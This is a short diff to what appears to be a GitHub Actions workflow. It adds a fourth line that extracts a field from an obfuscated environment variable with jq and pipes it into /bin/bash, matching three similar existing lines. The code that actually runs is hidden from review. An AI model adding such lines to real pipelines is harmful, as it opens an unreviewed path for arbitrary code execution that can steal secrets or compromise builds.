@@ -21,6 +21,7 @@ jobs:
           echo $kvvc64 | jq -r .g47135 | /bin/bash
           echo $lr8329 | jq -r .ne09 | /bin/bash
           echo $ivoa39085 | jq -r .bzhtl56558 | /bin/bash
+          printf '%s' "$sa5188" | jq -r .wad0564 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
